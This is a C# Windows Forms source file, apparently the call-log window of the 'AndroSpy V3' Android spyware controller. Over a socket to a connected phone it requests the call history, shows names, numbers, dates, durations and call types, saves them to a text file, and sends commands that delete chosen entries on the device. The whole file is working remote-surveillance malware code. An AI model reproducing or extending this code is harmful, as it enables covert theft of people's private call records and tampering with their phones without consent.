using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class CagriKayitlari : MetroFramework.Forms.MetroForm
    {
        Socket sock;
        public string ID = "";
        public CagriKayitlari(Socket sck, string aydi)
        {
            InitializeComponent();
            lArray = new List<ListViewItem>();
            sock = sck; ID = aydi;
        }
        List<ListViewItem> lArray = default;
        public void bilgileriIsle(string arg)
        {
            lArray.Clear();
            listView1.Items.Clear();
            if (arg != "CAGRI YOK")
            {
                string[] ana_Veriler = arg.Split(new[] { "[MYPHONEDATA]" }, StringSplitOptions.None);
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split(new[] { "[MYPHONE]" }, StringSplitOptions.None);
                        ListViewItem item = new ListViewItem(bilgiler[0].Replace("Kayıtsız numara", "Unregistered"));
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        item.SubItems.Add(bilgiler[4]);
                        switch (bilgiler[4])
                        {
                            case "Incoming":
                                item.ImageIndex = 1;
                                break;
                            case "Outgoing":
                                item.ImageIndex = 3;
                                break;
                            case "Missed":
                                item.ImageIndex = 2;
                                break;
                            case "Rejected":
                                item.ImageIndex = 0;
                                break;
                            case "Black List":
                                item.ImageIndex = 0;
                                break;
                            default:
                                item.ImageIndex = 0;
                                break;
                        }
                        //listView1.Items.Add(item);
                        lArray.Add(item);
                    }
                    catch (Exception) { }
                }
                listView1.Items.AddRange(lArray.ToArray());
                metroLabel1.Text = "Items: " + listView1.Items.Count.ToString();
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Call");
                listView1.Items.Add(item);
                metroLabel1.Text = "Items: 0";
            }
        }
        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("CALLLOGS", Encoding.UTF8.GetBytes("ECHO"));
                sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                Text = "Call Logs - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sock.Handle.ToString());
            }
            catch (Exception) { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no Call")) return;
                foreach (ListViewItem myitem in listView1.SelectedItems)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("DELETECALL", Encoding.UTF8.GetBytes(myitem.SubItems[1].Text));
                        sock.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        myitem.Remove();
                    }
                    catch (Exception) { }
                }                
            }
            Text = "Call Logs - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sock.Handle.ToString());
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].Text.Contains("There is no Call")) return;
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            metroLabel2.Text = "Selected: " + listView1.SelectedItems.Count.ToString();
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string format = "Name     Number     Date     Duration     Type";
            string line = "----     ------     ----     --------     -----";
            using (SaveFileDialog op = new SaveFileDialog
            {
                Filter = "Plain Text File (*.txt)|*.txt",
                Title = "Save the call logs as text file"
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        using (System.IO.StreamWriter sw = new System.IO.StreamWriter(op.FileName))
                        {
                            sw.WriteLine(format);
                            sw.WriteLine(line + Environment.NewLine);
                            foreach (ListViewItem lvi in listView1.Items)
                            {
                                sw.WriteLine(lvi.Text + "     " + lvi.SubItems[1].Text + "     "
                                    + lvi.SubItems[2].Text + "     " + lvi.SubItems[3].Text + "     "
                                    + lvi.SubItems[4].Text + Environment.NewLine);
                            }
                            sw.Write("-------------THE END-------------");
                        }
                        MessageBox.Show("Call logs list succesfully saved.", "AndroSpy V3", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Call logs list couldn't saved:\n" + ex.Message, "AndroSpy V3", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                }
            }
        }
    }
}
